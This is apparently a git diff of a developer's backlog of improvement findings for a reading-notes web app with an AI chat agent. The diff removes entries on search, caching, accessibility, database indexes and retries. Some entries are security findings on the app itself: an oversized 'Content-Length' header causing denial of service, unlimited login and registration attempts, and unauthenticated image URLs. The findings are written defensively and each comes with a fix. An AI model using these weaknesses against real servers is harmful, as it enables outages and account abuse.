@@ -7,39 +7,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ## 2026-05-30
 
-### E1 — Global search ignores the quotes tab entirely (S)
-**What:** `globalSearch()` in `app.js:1049-1066` calls only `matchBooks()` and passes results to `renderSearchResults()`. The existing `matchQuotes()` helper at `app.js:887` is never invoked from this path. A user who searches for keywords they remember from a quote gets no results unless they switch to the quotes tab and type again in the per-tab search box.
-
-**Why it matters:** Search is a core discovery flow. Silently returning only book results while ignoring an existing, functional quote-search helper is a UX gap that will grow more painful as users accumulate more quotes. The fix is ~10 lines: call `matchQuotes()`, render matched quotes as a second section in `renderSearchResults()`.
-
-**Complexity:** S — `app.js` only; no backend changes needed. `global-search.test.js` would need one new test case.
-
-**Files:** `app.js:877-888, 1017-1066`; `tests/frontend/global-search.test.js`
-
----
-
-### E2 — `imghdr` is deprecated and removed in Python 3.13 (S)
-**What:** `app_server.py` imports `imghdr` (line 8) and uses it at line 1677 (`imghdr.what(None, binary)`) to detect image format when saving uploaded images. Python 3.11 already emits a `DeprecationWarning`; `imghdr` is removed in Python 3.13. A runtime upgrade would cause an `ImportError` crash on the first image upload.
-
-**Why it matters:** The risk is a silent ticking bomb — works today, breaks on upgrade. The fix is a 5-line magic-bytes fallback: PNG starts with `\x89PNG`, JPEG with `\xff\xd8`, WebP with `RIFF...WEBP`. No external dependency needed.
-
-**Complexity:** S — one function (`save_image`, ~5 lines), no schema changes, no test changes required.
-
-**Files:** `app_server.py:8, 1675-1690`
-
----
-
-### E3 — Static JS/CSS served with `no-store`; ETag/304 would eliminate repeat downloads (S)
-**What:** `app.js`, `chat.js`, and `styles.css` are served with `Cache-Control: no-store, no-cache, must-revalidate` (line 2989). On every page load — even a PWA re-open — the browser downloads the full 100KB+ of JS and CSS from scratch. The `/assets/` route already uses `immutable` caching (line 3011); only the main app files are missing this optimization.
-
-**Why it matters:** Mobile users on slow connections experience a noticeable lag on each app open. Adding ETag (SHA-256 of file bytes, computed once at startup) + 304 short-circuit costs ~10 lines of Python and zero risk — the existing `CLIENT_VERSION` / build-version check already ensures stale caches are busted on deploy.
-
-**Complexity:** S — all in the `do_GET` static file handler (`app_server.py:2984-2993`). No frontend changes needed.
-
-**Files:** `app_server.py:2963-2993`
-
----
-
 ### E4 — `link_thought` action missing from backend execution test suite (S)
 **What:** `tests/agent/agent_backend_reliability_test.py:334` tests `add_book`, `add_note`, `summary`, `question`, and `tag` actions end-to-end, but `link_thought` (the most complex action in `ActionExecutor`) has no coverage at the execution layer. The executor validates `kind` against a 5-item whitelist, checks source/target types, verifies that referenced IDs exist in state, and can produce three distinct error paths — all untested.
 
@@ -86,62 +53,7 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E8 — `json.loads()` in `summarize_metrics()` has no error handling — one corrupted row crashes the whole metrics endpoint (S)
-**What:** `MetricsCollector.summarize_metrics()` at `app_server.py:2427` calls `json.loads(row["dimensions"])` inside a loop over all metric rows with no try-except. The `dimensions` column is written by `record_metric()` — if any row has truncated JSON (e.g., from a mid-write crash or a schema migration), the entire call raises `json.JSONDecodeError` and the `/debug/metrics` and `/debug/logs` endpoints return 500.
-
-**Why it matters:** One bad row in `agent_metrics` breaks the metrics dashboard for that user permanently until manual DB surgery. The fix is a two-line try-except that skips the bad row and continues.
-
-**Complexity:** S — wrap the `json.loads` call at line 2427 in `try/except json.JSONDecodeError`, log a warning, and `continue`.
-
-**Files:** `app_server.py:2401-2435` (`MetricsCollector.summarize_metrics`)
-
----
-
-### E9 — `_read_json()` reads the full request body with no size cap — DoS via oversized payload (M)
-**What:** `_read_json()` at `app_server.py:2899-2902` reads `content_length = int(self.headers.get("Content-Length", "0"))` and then calls `self.rfile.read(content_length)` with no upper bound. All POST endpoints that accept JSON (including `/api/upload-image` and `/api/quotes/ocr` which receive base64-encoded images) allocate however many bytes the caller claims. An unauthenticated attacker — or one who passes the rate-limit check on the first request — can send a `Content-Length: 2000000000` header and force the process to block reading and allocate gigabytes.
-
-**Why it matters:** The server is a single-process `ThreadingHTTPServer` with no reverse proxy in the default dev setup. One malicious request can starve all other users. Adding a `MAX_REQUEST_BYTES` constant (~20 MB) and a 413 rejection before the read costs three lines.
-
-**Complexity:** M — add constant `MAX_REQUEST_BYTES = 20 * 1024 * 1024`; in `_read_json()` reject with 413 if `content_length > MAX_REQUEST_BYTES`; add the same check in the Stripe webhook raw-body read at line 3676-3677.
-
-**Files:** `app_server.py:2899-2902` (`_read_json`), `app_server.py:3676-3677` (webhook handler)
-
----
-
-### E10 — Export exists but there is no import endpoint — backups are unrestorable (M)
-**What:** `GET /api/account/export` at `app_server.py:3129-3188` produces a complete JSON dump of user state, model logs, agent traces, and uploaded file metadata. There is no corresponding `POST /api/account/import` endpoint. The export JSON even includes an `exportFormat: 1` version field, signalling intent for a future importer — but that importer was never built.
-
-**Why it matters:** Users who export their data for backup, account migration, or GDPR reasons cannot restore it. The export file is therefore a dead artefact. For a SaaS product with a "data export" compliance feature, the absence of restore makes the export promise hollow.
-
-**Complexity:** M — add `POST /api/account/import` that: (1) reads the export JSON; (2) validates `exportFormat == 1`; (3) passes `payload["state"]` through `sanitize_state()`; (4) calls `save_state()`. No image files are restored (note that in the export body); document this clearly. Add one integration test.
-
-**Files:** `app_server.py` (new handler near line 3129); `tests/agent/account_export_delete_test.py`
-
----
-
 ## 2026-05-31
-
-### E11 — Four GC functions defined but never called — DB grows forever (S)
-**What:** `gc_expired_sessions()`, `gc_expired_password_reset_tokens()`, `gc_old_server_errors()`, and `gc_old_rate_limit_rows()` are all fully implemented in `app_server.py` (lines 1019, 1485, 1495, 1503) and are tested individually in `session_expiry_test.py`, `server_errors_test.py`, and `rate_limit_test.py`. None of them are called anywhere outside those tests — not at startup, not on a timer, not on any request. Every expired session row, every used/expired password reset token, every server error older than 30 days, and every stale rate-limit counter window persists in the DB forever. The `main()` function at line 4631 only calls `init_db()` and `serve_forever()`.
-
-**Why it matters:** On a live deployment this is a slow leak. Rate-limit counters alone create two rows per user per active hour/day window; after a year of moderate use the table will have tens of thousands of orphan rows, degrading the `BEGIN IMMEDIATE` lock contention in `check_and_record_rate_limit()`. Sessions never expire from the DB even though `SESSION_LIFETIME_DAYS` is enforced at the query level, wasting storage. The fix is trivial: add a background thread (or a per-request probabilistic trigger) that calls all four GC functions with a fresh connection. No schema changes, no new logic.
-
-**Complexity:** S — one new helper `_run_gc()` that calls all four GC functions, invoked as a daemon thread at startup (every 6 hours). Five lines of new code.
-
-**Files:** `app_server.py:1019, 1485, 1495, 1503, 4631-4638`
-
----
-
-### E12 — HTML responses served with no security headers (S)
-**What:** The `_STATIC` handler in `do_GET()` (line 2995-3005) serves `landing.html`, `index.html`, `privacy.html`, and `terms.html` with only `Content-Type` and `Cache-Control` headers. There are no `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, or `Referrer-Policy` headers. The JSON API sends `Access-Control-Allow-Origin: *` on every endpoint (lines 2883, 2894, 2905, 2965), including authenticated ones.
-
-**Why it matters:** Without `X-Frame-Options: SAMEORIGIN`, the app pages can be embedded as iframes for clickjacking attacks. Without `X-Content-Type-Options: nosniff`, older browsers can MIME-sniff responses. For a commercial app handling user reading data and payment flows, these headers are baseline hygiene expected by any security scanner. The fix is 4-5 header lines added to the static-file response block and one helper method that emits them consistently.
-
-**Complexity:** S — add `_send_security_headers()` helper; call it in `do_GET()` for HTML responses. Touch: `app_server.py:2995-3005`.
-
-**Files:** `app_server.py:2890-2909, 2995-3005`
-
----
 
 ### E13 — Static files read from disk on every HTTP request (S)
 **What:** The `_STATIC` dict in `do_GET()` at line 2983 is rebuilt as a local variable on every request, and each file is read fresh with `(BASE_DIR / filename).read_bytes()` (line 2997) on every hit — no in-memory cache. `app.js` (~115 KB), `styles.css` (~100 KB), and `landing.html` change only on deploy. On a busy server serving the PWA to mobile users, this means repeated disk I/O for large files that never change at runtime.
@@ -178,28 +90,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ## 2026-06-01
 
-### E16 — `call_deepseek()` has zero retry logic; transient 429/502 silently fails three critical paths (S)
-**What:** `call_kimi_vision()` has `KIMI_VISION_MAX_ATTEMPTS = 2` with retry on HTTP 503 and timeout (lines 2794, 2835, 2842). The plain `call_deepseek()` at line 2703 does the opposite: any `HTTPError` or `URLError` raises immediately. This function is used in three production paths: (a) the non-streaming fallback when `stream_finish_reason != "stop"` (line 4101); (b) the OCR DeepSeek fallback after Kimi vision fails (line 1821); (c) chat history compression at line 1826. DeepSeek's API returns transient 429s under load and occasional 502s. In all three cases, the caller catches `RuntimeError` and surfaces a user-facing error with no retry.
-
-**Why it matters:** History compression failing silently already degrades context quality; the streaming fallback path is hit on roughly every long LLM response. A single exponential-backoff retry (max 2 attempts, 1s delay) with a `_is_retryable_http_error(code)` check (codes 429, 500, 502, 503) eliminates most transient failures at negligible latency cost for the happy path.
-
-**Complexity:** S — add a `_retryable_deepseek_call(messages, model, max_tokens, attempts=2)` wrapper or extend `call_deepseek()` with a `retries` param; replicate the retry pattern from `call_kimi_vision()` at lines 2835-2850. Touch: `app_server.py:2703-2731`.
-
-**Files:** `app_server.py:2703-2731, 2780-2854` (retry pattern reference), callers at lines 1821, 1826, 4101
-
----
-
-### E17 — Buttons have no `:focus-visible` style — keyboard users get zero focus indicator (S)
-**What:** `styles.css` sets `outline: none` for `input:focus`, `select:focus`, `textarea:focus` (line 533) and provides a `box-shadow` focus ring for those elements. But no `:focus` or `:focus-visible` rule exists for any button selector: `.circle-action`, `.icon-btn`, `.tag-chip-pick`, `.filter-chip`, `.me-list-btn`, `.book-card`, or the generic `button`. Keyboard users tabbing through the app see the browser's default blue outline suppressed by global `* { box-sizing: border-box }` inheritance, or nothing at all. Zero occurrences of `:focus-visible` in the 3451-line stylesheet.
-
-**Why it matters:** WCAG 2.1 SC 2.4.7 (Focus Visible, Level AA) requires that any keyboard-operable UI component has a visible focus indicator. The app has 30+ interactive buttons in the main UI, including the critical chat submit, book-add, and action-approve buttons. A fix is a three-line CSS addition; it's a baseline accessibility gap for a commercial product.
-
-**Complexity:** S — add a single CSS rule: `button:focus-visible, [role="button"]:focus-visible { outline: 2px solid var(--color-ink); outline-offset: 2px; }`. No HTML changes required. Touch: `styles.css` (after line 540).
-
-**Files:** `styles.css:533-540` (input focus block — add sibling rule); impacts all button types in `index.html`
-
----
-
 ### E18 — `estimate_tokens()` underestimates Chinese text by 2–3× — debug dashboard costs are wrong (S)
 **What:** `estimate_tokens()` at line 300 returns `len(text) // 4`. This heuristic is calibrated for English (average ~4 chars/token). Chinese content tokenizes at roughly 1.5–2 characters per token in DeepSeek's tokenizer (BPE over UTF-8 bytes, where each CJK character encodes to 3 bytes). A 600-character Chinese message (`len = 600`) returns `estimate_tokens = 150`, but the actual token count is ~400. All `model_logs` input/output token fields and the `agent_metrics` summaries on `/debug/logs` use this estimate. Users monitoring cost or quota burn see numbers that are ~60% too low.
 
@@ -233,29 +123,7 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E21 — App ships with no `prefers-color-scheme: dark` support; reading at night forces bright white screen (M)
-**What:** `styles.css` defines all colours via CSS custom properties in `:root` (e.g., `--color-bg`, `--color-surface`, `--color-ink`) but there is no `@media (prefers-color-scheme: dark)` block anywhere in the 3451-line file. System dark mode (iOS 13+, Android 10+) is ignored; users who enable dark mode on their phone open the app to a bright white reading interface at night. The landing page, app shell, chat panel, and all dialogs stay full-brightness regardless.
-
-**Why it matters:** This is a reading app with a strong night-time use case. The CSS variable architecture is already dark-mode ready — the entire dark theme is adding a `@media (prefers-color-scheme: dark)` block that redefines ~10 root variables (`--color-bg → #1a1a1a`, `--color-surface → #242424`, `--color-ink → #e8e8e8`, etc.). No component changes needed; the variables propagate automatically. This is the highest visual-polish gap visible on the first daily use by any new mobile user.
-
-**Complexity:** M — define a dark-mode variable block (~15 lines) and audit contrast ratios for the ~8 semantic colour variables; verify that image overlays, chat bubbles, and tag chips all remain readable. May need minor per-component overrides. Touch: `styles.css` (new `@media` block near top, plus targeted overrides).
-
-**Files:** `styles.css` (CSS vars at top, targeted overrides for `.chat-bubble`, `.tag-chip`, `.book-card`, `.me-drawer`)
-
----
-
 ## 2026-06-02
-
-### E22 — `model_logs` and `agent_traces` have no `user_id` index — debug dashboard does full table scans (S)
-**What:** `init_db()` creates five user-content tables but only defines indexes for `rate_limit_counters(updated_at)`, `server_errors(created_at)`, `password_reset_tokens(user_id)`, and `payments(user_id, subscription_id)`. `model_logs`, `agent_traces`, `agent_actions`, and `agent_metrics` have no secondary indexes at all. `list_logs()` (`app_server.py:1810-1875`) queries `WHERE model_logs.user_id = ? ORDER BY model_logs.created_at DESC LIMIT 30` — a full table scan over every row from every user. The `/debug/logs` debug dashboard and the metrics aggregation in `summarize_metrics()` both hit these unindexed paths on every load.
-
-**Why it matters:** As OPT-005 (now done) made the debug dashboard actively used, and OPT-016 drives more OCR calls into `model_logs`, the table grows continuously. For a Plus user making 240 calls/day, `model_logs` reaches 87,000+ rows/year. The `list_logs` query's cost scales linearly with total row count across all users — the dashboard that was instant at 1,000 rows becomes noticeably slow at 50,000. Adding three covering indexes eliminates the full scan entirely and is a zero-risk, zero-schema-change improvement.
-
-**Complexity:** S — add three `CREATE INDEX IF NOT EXISTS` lines to `init_db()` (the `executescript` block at line 341): `idx_model_logs_user_created ON model_logs(user_id, created_at)`, `idx_agent_traces_user_created ON agent_traces(user_id, created_at)`, `idx_agent_actions_trace ON agent_actions(trace_id)`. SQLite creates the indexes on next startup; existing data is automatically indexed.
-
-**Files:** `app_server.py:337-490` (init_db executescript block)
-
----
 
 ### E23 — `resolve_user_from_token` issues a DB write on every authenticated request — unnecessary write churn on read-heavy workload (S)
 **What:** `resolve_user_from_token()` at `app_server.py:1262` unconditionally issues `UPDATE sessions SET last_seen_at = ? WHERE token = ?` on every call, even for purely read-only requests (`GET /api/session`, `GET /api/model-logs`, `GET /api/account/plan`). The mobile PWA calls `/api/session` on every app open and each tab-focus event, triggering a write per open. With multiple browser tabs or a polling debug dashboard, this creates a steady write-lock storm on the SQLite file — even idle browse sessions hold a write lock momentarily on every GET.
@@ -265,41 +133,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 **Complexity:** S — in `resolve_user_from_token()` at line 1256–1263, add: `if time.time() - last_seen_epoch > 300:` before the `conn.execute("UPDATE sessions …")` call. Two-line change, no schema changes, no tests need updating.
 
 **Files:** `app_server.py:1241-1264` (`resolve_user_from_token`)
-
----
-
-### E24 — Streaming chat fetch has no AbortController timeout — server hang or silent network drop freezes the UI indefinitely (M) — ✅ DONE (commit c5c4281)
-**已实现，勿再提拔为 OPT 项。** `chat.js` 已加 `AbortController` + 30s idle timeout（`STREAM_IDLE_TIMEOUT_MS`，`chat.js:5,606-611`），计时器在 `await fetch` 前就 arm（覆盖 header 阶段的 iOS 切网半关闭）、每个 delta 重置、`finally` 清理；`AbortError` 渲染「请求超时，请重试」+ 内联重试按钮（`renderStreamTimeout`）。测试：`tests/frontend/chat-agent-approval.test.js:556`（fake timer 快进 30s）。
-
-**What:** `_doStreamAndFinalize()` in `chat.js:572-680` opens a streaming `fetch()` to `/api/chat/stream` with no `signal` attached. The inner `reader.read()` loop at line 622 stalls indefinitely if the connection goes silent — which happens regularly on iPhone when LTE/WiFi transitions occur mid-stream (the OS half-closes the TCP connection without sending an EOF). The user sees the "thinking" animation for potentially 5+ minutes until the OS TCP keepalive finally triggers a RST. The existing `recoverCompletedChatAfterLoadError` at line 526 only fires on an explicit JS exception, not on a stalled-but-open reader.
-
-**Why it matters:** Mobile reading sessions frequently happen in transit (commute, bed, café). A 5-minute frozen UI with no "retry" affordance erodes user trust and burns battery. The fix requires ~15 lines: create an `AbortController`, pass its `signal` to `fetch()`, and reset a 30-second inactivity `setTimeout` on each received `delta` chunk. Catch `AbortError` and render "请求超时，请重试" with a retry button.
-
-**Complexity:** M — changes in `chat.js:572-680` only. Needs one new test case in `tests/frontend/chat-agent-approval.test.js` asserting that an abort mid-stream renders the timeout message.
-
-**Files:** `chat.js:572-680`; `tests/frontend/chat-agent-approval.test.js`
-
----
-
-### E25 — CSS transitions and infinite animation lack `prefers-reduced-motion` guard — WCAG Level A violation (S)
-**What:** `styles.css` applies CSS `transition` on 8+ selectors (lines 356, 552, 1058, 1848, 1974, 2180, 2553, 2729, 3440) and defines an infinite `@keyframes chat-dot-pulse` animation (line 1878) used in `.chat-bubble-loading`. There is no `@media (prefers-reduced-motion: reduce)` block anywhere in the 3,451-line stylesheet. Users with iOS "Reduce Motion" or Android "Remove animations" enabled receive the full set of transitions and the indefinitely-looping loading animation.
-
-**Why it matters:** WCAG 2.1 SC 2.2.2 (Pause, Stop, Hide — Level A) is violated by the infinite `chat-dot-pulse` animation: it plays for the entire duration of an AI response (5–30 s) with no way for the user to pause it. SC 2.3.3 (Animation from Interactions — Level AAA) covers the decorative transitions. Level A is a baseline commercial requirement; the fix is a single 4-line CSS block. It also benefits users on low-end devices where GPU-accelerated transitions can cause jank.
-
-**Complexity:** S — add one `@media (prefers-reduced-motion: reduce)` block near the top of `styles.css` (after the `:root` vars, before line 356): `*, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }`. No HTML or JS changes.
-
-**Files:** `styles.css:350-360` (add block after CSS vars section); primary impact: `styles.css:1875-1885` (chat-dot animation)
-
----
-
-### E26 — Handler methods acquire `conn` but close it manually without `try/finally` — exceptions after `_require_user()` leak the connection (M)
-**What:** All 40+ route branches in `do_GET()`, `do_POST()`, `do_PUT()`, `do_DELETE()` follow the pattern: acquire via `conn, user = self._require_user()` then close manually at each exit point with `conn.close()`. If any unexpected exception is raised between these two points — for example an unhandled `KeyError` when processing a malformed-but-valid-JSON request body, or a `TypeError` inside a helper — the connection is never closed. Python's `sqlite3.Connection` objects are not reliably collected on exception; they remain open until the next GC cycle (or indefinitely in CPython with reference cycles).
-
-**Why it matters:** Each leaked connection holds a shared-cache lock on the SQLite file. Under sustained load with occasional edge-case exceptions, leaked connections accumulate and can cause `sqlite3.OperationalError: database is locked` for other concurrent requests. The correct fix is to wrap handler bodies in `with get_conn() as conn:` or use `try/finally` — but touching 40+ branches is a medium refactor. A lower-effort intermediate fix is to wrap the outermost `_require_user` in a context manager that guarantees `conn.close()` on exit regardless of exception.
-
-**Complexity:** M — introduce a `_require_user_ctx()` context manager (or add `try/finally` wrapping to the 5 main handler bodies). Touch: `app_server.py:3195-3202` + all handlers.
-
-**Files:** `app_server.py:3195-3202` (`_require_user`); `app_server.py:3243-4993` (all four handler methods)
 
 ---
 
@@ -316,28 +149,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E28 — Toast notification lacks `aria-live` — screen reader users never hear transient feedback (S)
-**What:** `#toast` at `index.html:620` is a `<div class="toast">` with no `role` or `aria-live` attribute. `showToast()` in `app.js:395-408` updates `textContent` and toggles a CSS class to show/hide it. Screen readers only announce dynamic content changes when the element has `aria-live="polite"` (or `role="status"`, which implies it). Messages like "登录已过期，请重新登录", "注册成功，已自动登录", and validation errors (line 1546-1558) are completely invisible to assistive technology. WCAG 2.1 SC 4.1.3 (Status Messages, Level AA) requires that status messages be programmatically determinable without receiving focus.
-
-**Why it matters:** Toast is the primary feedback channel for all form submissions, auth events, and error states. For a commercial product, failing WCAG 4.1.3 AA on the single most-used feedback element is a baseline compliance gap. The fix is one HTML attribute addition with zero JS changes — `role="status"` on `#toast` implies `aria-live="polite"` and `aria-atomic="true"` automatically.
-
-**Complexity:** S — add `role="status" aria-atomic="true"` to the `<div id="toast">` element at `index.html:620`. No JS or CSS changes needed.
-
-**Files:** `index.html:620`
-
----
-
-### E29 — `PromptBuilder` injects `existing_connections[:20]` into every chat request — irrelevant for 80%+ of chats (S)
-**What:** `PromptBuilder.build_chat_prompt()` at `app_server.py:2241` always includes `"existing_connections": user_state.get("connections", [])[:20]` in the system prompt payload, regardless of chat context. The system instruction for book-scoped and quote-scoped chats (lines 2270-2275) explicitly says to return `link_thought` **only when the user explicitly asks** for cross-book associations — meaning the connection list is injected as mandatory context into requests where it is never supposed to be used. A user with 50 connections accumulates ~150 tokens of connection noise per request. At 240 chat requests/day for a Plus user, that's 36,000 wasted context tokens per day.
-
-**Why it matters:** Reducing prompt token waste lowers per-user API costs directly. The fix is conditional: skip `existing_connections` (or set it to `[]`) when the context is `"book"` or `"quote"` — the two cases where the system instruction already prohibits connection usage. Only the `"global"` context and explicit link intents need it. Two-line change with zero behavior impact for the common case.
-
-**Complexity:** S — in `build_chat_prompt()` (`app_server.py:2241`), change `"existing_connections": user_state.get("connections", [])[:20]` to `"existing_connections": [] if book_id else user_state.get("connections", [])[:20]`. Touch: `app_server.py:2241`.
-
-**Files:** `app_server.py:2223-2257` (`PromptBuilder.build_chat_prompt`)
-
----
-
 ### E30 — Form inputs have no `maxlength` — pasting large text creates unbounded state documents (S)
 **What:** None of the form inputs in `index.html` have `maxlength` attributes: the book title input (line 379), author input (line 380), notes textarea (line 402), quote content textarea (`id="quoteContent"`, line 459), reflection textarea (line 470), session note textarea (line 426), and connection thought textarea (line 607). The backend's only length guard is the 20 MB request cap in `_read_json()` and a 2000-char cap for chat messages (`app_server.py:2152`). A user accidentally pasting a chapter of text into the quote content field creates a state blob that is valid to the backend but semantically broken — it inflates `PUT /api/state` payloads, bloats the SQLite `state_json` column, and inflates the context that `PromptBuilder` injects into chat prompts. There is no user-facing warning that a field is unreasonably long.
 
@@ -350,28 +161,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 ---
 
 ## 2026-06-04
-
-### E31 — Auth endpoints have no rate limiting — credential stuffing and spam registration undefended (M)
-**What:** `_enforce_rate_limit()` is called for `chat` (lines 4580, 4823) and `ocr` (lines 4246, 4291, 4342), but the three auth endpoints receive zero rate-limit protection: `/api/login` (line 3939), `/api/register` (line 3889), `/api/password/reset-request` (line 4015), and `/api/password/reset` (line 4082). An attacker can issue unlimited login attempts against any username, spray passwords across many accounts, or flood `/api/register` to create thousands of users (triggering DB writes, session rows, and `user_state` rows on each attempt).
-
-**Why it matters:** The existing `check_and_record_rate_limit()` is user-id–based and only kicks in post-auth, making it structurally unable to defend pre-auth endpoints. A modest IP-or-username–based lockout (e.g., 10 failed login attempts per username per 15 minutes using a lightweight in-memory `collections.Counter` or a new DB table similar to `rate_limit_counters`) would eliminate the attack surface. DeepSeek and Kimi API keys are gated behind the chat/ocr limits; the user DB is currently completely open to automated abuse.
-
-**Complexity:** M — add a `check_login_rate_limit(username, ip)` helper that reuses or extends the existing `rate_limit_counters` table; apply it at the top of the `/api/login` and `/api/password/reset-request` handlers. For `/api/register`, an IP-based counter suffices (no username yet). Touch: `app_server.py:3889-3950, 4015-4087` (handlers); `app_server.py:1462-1530` (`check_and_record_rate_limit` reference).
-
-**Files:** `app_server.py:3889, 3939, 4015, 4082`; `app_server.py:1462-1530` (rate-limit helper); tests in `tests/agent/rate_limit_test.py`
-
----
-
-### E32 — `/media/` serves user images unauthenticated with wildcard CORS — any site can hotlink private photos (S)
-**What:** The `/media/` handler at `app_server.py:3497-3519` has no `_require_user()` call — no authentication is required at all. It also sends `Access-Control-Allow-Origin: *` (line 3509) and `Cache-Control: public, max-age=31536000, immutable` (line 3510). Images are stored under `/uploads/{user_id}/{filename}` where both segments are UUIDs, so paths are hard to guess, but once a URL is known (e.g., extracted from a chat export or from browser DevTools): (a) any third-party website can hotlink the image, (b) CDN/proxy caches store it permanently under a `public` directive, (c) anyone — including logged-out users — can retrieve it indefinitely. Book covers and quote photos may include personal/private content (handwritten notes, receipts used as bookmarks, etc.).
-
-**Why it matters:** The minimum fix is a one-line change: remove `Access-Control-Allow-Origin: *` from the `/media/` response (the images are only loaded via `<img src>` from the same origin in the app, so cross-origin access is never needed). This closes the hotlinking vector at zero cost to functionality. A deeper fix — adding authentication to `/media/` — requires converting all `<img src="/media/...">` to fetch-based blob URLs; that is M-complexity and can be a follow-up.
-
-**Complexity:** S (minimum fix: remove one header line, `app_server.py:3509`). M if full auth-gating of `/media/` is desired later.
-
-**Files:** `app_server.py:3509` (delete the `Access-Control-Allow-Origin` header line in the `/media/` block); `app_server.py:3497-3519`
-
----
 
 ### E33 — `sanitize_state()` passes through arrays with no count caps — bloated state inflates DB, sync cost, and prompt tokens (S)
 **What:** `sanitize_state()` at `app_server.py:614-648` validates array types but imposes no length limit: `books`, `sessions`, `quotes`, `connections`, and the `chatHistories` dict are all accepted at whatever size the client sends. A user (or a compromised token) can `PUT /api/state` with 10,000 quotes each containing a 3,000-character reflection, producing a 30 MB+ `state_json` in `user_state`. `PromptBuilder` caps `books[:5]` before injecting into the system prompt (line 2256), but the rest of the raw state is stored and loaded on every request. A bloated `user_state` row makes every `load_state()` call in the hot chat path slower.
@@ -395,40 +184,7 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 
 ---
 
-### E35 — `syncState()` has no optimistic locking — concurrent tabs or devices silently overwrite each other (M)
-**What:** `syncState()` at `app.js:755-767` issues a blind `PUT /api/state` with the full local `state` object. The `user_state` table has an `updated_at` column (line 401) that is written by `save_state()` (line 671) on every mutation, but the value is never returned to or compared by the client. When a user has the app open in two tabs simultaneously (phone + browser, or two windows) and both make edits, the second `PUT` simply overwrites the first — the last save wins, silently discarding the other session's work. On a reading app, a user might add a quote on their phone and an annotation on their desktop in the same minute, losing one of them invisibly.
-
-**Why it matters:** A simple optimistic locking mechanism (`If-Match`/`ETag` pattern or a monotonic version counter) would detect this conflict and return a 409, allowing the client to surface "状态已被其他标签页修改，请刷新" before data loss occurs. The `updated_at` column is already present; the fix requires returning it from `GET /api/state` and `PUT /api/state`, and checking it on write — about 8 lines of backend Python and 5 lines of frontend JS.
-
-**Complexity:** M — backend: return `{ state, stateVersion: updated_at }` from both `GET /api/state` and `PUT /api/state`; add a version-check guard in `save_state()` that rejects with 409 if `updated_at ≠ client_version` when client supplies one. Frontend: store `stateVersion` after load/sync; include as `X-State-Version` header on PUT; handle 409 by showing a reload prompt. Touch: `app_server.py:668-671` (`save_state`), `app_server.py:3584-3622` (`GET /api/state`); `app.js:755-767` (`syncState`), `app.js:769-800` (`loadSession`).
-
-**Files:** `app_server.py:668-671, 3584-3622`; `app.js:755-767, 769-800`
-
----
-
 ## 2026-06-05
-
-### E36 — `ActionExecutor` uses `datetime.now().isoformat()` — agent-created records carry naïve local time + microseconds (same timezone bug as OPT-014, unfixed path) (S)
-**What:** Every record written by `ActionExecutor.execute_action()` uses the bare `datetime.now().isoformat()` call (7 sites: `app_server.py:2971, 2994, 3014, 3024, 3035, 3045, 3074`) for `createdAt` and `updatedAt`. This produces timestamps like `2026-06-05T20:34:56.123456` — naïve local time, microsecond precision, no timezone suffix. OPT-014 fixed this exact bug on the OCR path by replacing `now_iso()` with `utc_now_iso()`, and the frontend sort was updated to use `Date.parse` epoch diff. But the agent action path was never updated: every agent-created `add_note`, `add_book`, `question`, `link_thought` record still uses the local-time call with microseconds.
-
-**Why it matters:** The frontend sorts books and quotes by `new Date(b.createdAt) - new Date(a.createdAt)`. `new Date("2026-06-05T20:34:56.123456")` is parsed as **local time** by the browser, giving it an effective UTC offset of +8h relative to user-created records (which use `new Date().toISOString()` = UTC+Z). On a UTC+8 server, every agent-created record appears ~8 hours ahead of any user-created record from the same moment — same root cause as OPT-014, same population of users (anyone using the agent actions), same silent display corruption.
-
-**Complexity:** S — replace all 7 `datetime.now().isoformat()` calls inside `ActionExecutor.execute_action()` with `utc_now_iso()`. No schema changes, no interface changes, no test changes. One-line `%s` substitution per call site.
-
-**Files:** `app_server.py:2971, 2994, 3014, 3024, 3035, 3045, 3074`
-
----
-
-### E37 — `agent_trace_events` table has no index on `trace_id` — trace detail fetch is a full table scan (S)
-**What:** `init_db()` at `app_server.py:500-508` creates covering indexes for `model_logs`, `agent_traces`, `agent_actions`, and `agent_metrics`, but none for `agent_trace_events` (defined at lines 421-428). The query at line 2645 — `SELECT … FROM agent_trace_events WHERE trace_id = ? ORDER BY created_at ASC` — runs against an unindexed 421-row (and growing) table. Every call to `get_trace()` (line 2640) or any trace-detail API that joins events must do a full table scan across events from all users to find matching rows.
-
-**Why it matters:** `agent_trace_events` grows at the same rate as `agent_traces` (one row per pipeline stage per request). For a Plus user at 240 req/day over a year, the table reaches ~250,000 rows. Without an index, each trace-detail load scans every one. This is exactly the same problem OPT-017 fixed for `model_logs` and `agent_traces`; `agent_trace_events` was simply missed. Adding the index is zero-risk and takes one line.
-
-**Complexity:** S — add `CREATE INDEX IF NOT EXISTS idx_trace_events_trace ON agent_trace_events(trace_id, created_at)` to the `executescript` block in `init_db()`. SQLite builds the index on next startup; existing data is automatically indexed.
-
-**Files:** `app_server.py:500-509` (`init_db` index block); `app_server.py:2645` (query that benefits)
-
----
 
 ### E38 — Account export fetches ALL `agent_traces` + `agent_actions` without a row cap — can exhaust RAM for heavy users (S)
 **What:** The `/api/account/export` handler at `app_server.py:3610-3625` issues two unbounded `SELECT … WHERE user_id = ?` queries — one for `agent_traces` and one for `agent_actions` — and materialises both into Python lists before `json.dumps()` them. A Plus user with 12 months of daily use accumulates ~87,000 trace rows and ~87,000+ action rows. Materialising 174,000 rows into RAM (each containing multi-field dicts with action JSON blobs) consumes hundreds of MB, blocks the single HTTP-handler thread for several seconds, and can OOM the process on a small VPS.
@@ -464,30 +220,6 @@ Strong ideas should also be promoted into `backlog.md` as new OPT-NNN items.
 ---
 
 ## 2026-06-06
-
-### E41 — `/debug/*` endpoints are world-readable when `ADMIN_TOKEN` is unset — all users' AI chat content exposed (S)
-
